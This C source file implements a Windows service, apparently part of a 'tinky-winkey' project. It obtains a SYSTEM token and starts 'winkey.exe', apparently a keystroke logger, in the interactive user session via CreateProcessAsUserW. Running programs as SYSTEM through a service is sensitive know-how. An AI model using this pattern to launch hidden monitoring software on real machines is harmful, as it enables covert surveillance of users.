#include "svc.h"

/*

typedef struct _SERVICE_STATUS {
  DWORD dwServiceType;  The type of service. This member can be one of the following values.
  DWORD dwCurrentState; The current state of the service. This member can be one of the following values.
  DWORD dwControlsAccepted; The control codes the service accepts and processes in its handler function (see Handler and HandlerEx). 
  DWORD dwWin32ExitCode; he error code the service uses to report an error that occurs when it is starting or stopping. 
  DWORD dwServiceSpecificExitCode; A service-specific error code that the service returns when an error occurs while the service is starting or stopping.
  DWORD dwCheckPoint; The check-point value the service increments periodically to report its progress during a lengthy start, stop, pause, or continue operation. 
  DWORD dwWaitHint; The estimated time required for a pending start, stop, pause, or continue operation, in milliseconds.
} SERVICE_STATUS, *LPSERVICE_STATUS;

*/

static DWORD WINAPI ServiceCtrlHandlerEx(DWORD ctrl, DWORD eventType, LPVOID eventData, LPVOID context)
{
    UNREFERENCED_PARAMETER(eventType);
    UNREFERENCED_PARAMETER(eventData);
    
    t_svc_ctx *ctx = (t_svc_ctx*)context;
    if (!ctx)
        return (0);

    if (ctrl == SERVICE_CONTROL_STOP)
    {
        if (ctx->status.dwCurrentState != SERVICE_RUNNING)
            return (0);
        ctx->status.dwCurrentState = SERVICE_STOP_PENDING;
        ctx->status.dwWaitHint = 3000; // estimate time for a pending start
        ctx->status.dwControlsAccepted = 1;
        if (!SetServiceStatus(ctx->hStatus, &ctx->status))
            printf("Set service status failed: %lu", GetLastError());

        if (!SetEvent(ctx->hStopEvent)) // sig stop
            printf("Set event failed: %lu", GetLastError());
    }
    return (0);
}

// session 0 -> not interactive
// session 1 -> interactive
// start service SYSTEM privilege (session 0)
void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
{
    UNREFERENCED_PARAMETER(argc);
    UNREFERENCED_PARAMETER(argv);

    t_svc_ctx   ctx;
    ZeroMemory(&ctx, sizeof(ctx));

    
    ctx.hStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (!ctx.hStopEvent)
    {
        printf("CreateEvent failed: %lu\n", GetLastError());
        return;
    }

    ctx.status.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    ctx.status.dwCurrentState = SERVICE_START_PENDING;

    ctx.hStatus = RegisterServiceCtrlHandlerExA(
        SERVICE_NAME,
        ServiceCtrlHandlerEx,
        &ctx
    );
    if (!ctx.hStatus)
    {
        printf("Register Service handler failed: %lu\n", GetLastError());
        return ;
    }

    ctx.status.dwControlsAccepted = SERVICE_ACCEPT_PAUSE_CONTINUE | SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    ctx.status.dwCurrentState = SERVICE_RUNNING;

    // notifies the SCM of the current status of service
    if (!SetServiceStatus(ctx.hStatus, &ctx.status))
        printf("Set service status failed: %lu", GetLastError());
    
    // duplicate SYSTEM token (session 1)
    
    HANDLE  hToken = GetSystemToken();

    UNREFERENCED_PARAMETER(hToken);

    // function for start programme winkey
    LPWSTR    exePath = L"C:\\Users\\larri\\Desktop\\tinky-winkey"; // MAX_PATH per default == 260
    //getFilePathFromExe(exePath, "winkey.exe");

    STARTUPINFOW        si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);

    if (!CreateProcessAsUserW(hToken, NULL, L"winkey.exe", NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, exePath, &si, &pi))
    {
        DBG("CreateProcessWithTokenW failed: %lu\n", GetLastError());
        CloseHandle(hToken);
        return;
    }

    DBG("%p", (int*)hToken);
    WaitForSingleObject(ctx.hStopEvent, INFINITE);
    
    ctx.status.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(ctx.hStatus, &ctx.status);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hToken);
}